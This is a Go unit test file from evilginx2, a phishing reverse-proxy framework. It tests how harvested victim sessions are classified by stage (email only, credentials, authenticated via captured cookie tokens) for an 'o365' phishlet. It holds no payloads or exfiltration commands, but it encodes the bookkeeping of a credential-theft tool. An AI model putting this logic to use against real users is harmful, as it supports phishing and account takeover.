package core

import (
	"path/filepath"
	"testing"

	"github.com/kgretzky/evilginx2/database"
)

func TestEffectiveStage(t *testing.T) {
	tokens := func() map[string]map[string]*database.CookieToken {
		return map[string]map[string]*database.CookieToken{".x.test": {"A": {Name: "A"}}}
	}
	cases := []struct {
		name string
		s    *database.Session
		want int
	}{
		{"untouched", &database.Session{}, database.StageVisited},
		{"email only", &database.Session{Username: "a@b.c"}, database.StageEmail},
		{"password but no tokens", &database.Session{Username: "a@b.c", Password: "p"}, database.StageCredentials},
		{"explicit stage wins", &database.Session{Stage: database.StageAuthenticated}, database.StageAuthenticated},
		{"legacy row with tokens and password", &database.Session{Password: "p", CookieTokens: tokens()}, database.StageAuthenticated},
		{"legacy row with tokens only", &database.Session{CookieTokens: tokens()}, database.StageCredentials},
	}
	for _, c := range cases {
		if got := effectiveStage(c.s); got != c.want {
			t.Errorf("%s: effectiveStage = %d, want %d", c.name, got, c.want)
		}
	}
}

func TestStageNames(t *testing.T) {
	if stageName(database.StageAuthenticated) != "authenticated" {
		t.Error("bad name for authenticated")
	}
	if stageName(database.StageEmail) != "email only" {
		t.Error("bad name for email only")
	}
	if stageName(99) != "visited" {
		t.Error("unknown stage should read as visited")
	}
}

func newStageProxy(t *testing.T) (*HttpProxy, *database.Database, func(string) int) {
	t.Helper()
	db, err := database.NewDatabase(filepath.Join(t.TempDir(), "s.db"))
	if err != nil {
		t.Fatal(err)
	}
	stage := func(sid string) int {
		list, err := db.ListSessions()
		if err != nil {
			t.Fatal(err)
		}
		for _, s := range list {
			if s.SessionId == sid {
				return s.Stage
			}
		}
		t.Fatalf("session %s not found", sid)
		return -1
	}
	newSess := func(sid string) *Session {
		return &Session{Id: sid, Custom: map[string]string{}, Params: map[string]string{},
			BodyTokens: map[string]string{}, HttpTokens: map[string]string{},
			CookieTokens: map[string]map[string]*database.CookieToken{}}
	}
	p := &HttpProxy{db: db, sessions: map[string]*Session{
		"sid-1": newSess("sid-1"),
		"sid-2": newSess("sid-2"),
	}}
	for _, sid := range []string{"sid-1", "sid-2"} {
		if err := db.CreateSession(sid, "o365", "https://x.test/", "ua", "1.2.3.4"); err != nil {
			t.Fatal(err)
		}
	}
	t.Cleanup(func() { _ = db.Close() })
	return p, db, stage
}

// The whole point: an email-only session must not read as captured.
func TestPromoteStageIsTruthfulAndMonotonic(t *testing.T) {
	p, _, stage := newStageProxy(t)

	p.setSessionUsername("sid-1", "alice@x.test")
	if got := stage("sid-1"); got != database.StageEmail {
		t.Fatalf("after email: stage = %d, want %d", got, database.StageEmail)
	}

	// an early completion signal alone must not mark it authenticated
	p.sessions["sid-1"].IsDone = true
	p.promoteStage("sid-1", database.StageEmail)
	if got := stage("sid-1"); got != database.StageEmail {
		t.Fatalf("email + early done: stage = %d, want %d (not authenticated)", got, database.StageEmail)
	}

	// ...but credentials arriving after a completion signal is a finished login
	p.setSessionPassword("sid-1", "hunter2")
	if got := stage("sid-1"); got != database.StageAuthenticated {
		t.Fatalf("password after done: stage = %d, want %d", got, database.StageAuthenticated)
	}

	// never demote
	p.promoteStage("sid-1", database.StageEmail)
	if got := stage("sid-1"); got != database.StageAuthenticated {
		t.Fatalf("stage was demoted to %d", got)
	}
}

func TestMarkAuthenticatedNeedsEvidence(t *testing.T) {
	p, _, stage := newStageProxy(t)

	p.promoteStage("sid-2", database.StageEmail)
	p.markAuthenticated("sid-2", false)
	if got := stage("sid-2"); got != database.StageEmail {
		t.Fatalf("unevidenced markAuthenticated promoted to %d", got)
	}
	p.markAuthenticated("sid-2", true)
	if got := stage("sid-2"); got != database.StageAuthenticated {
		t.Fatalf("evidenced markAuthenticated left stage at %d", got)
	}
}
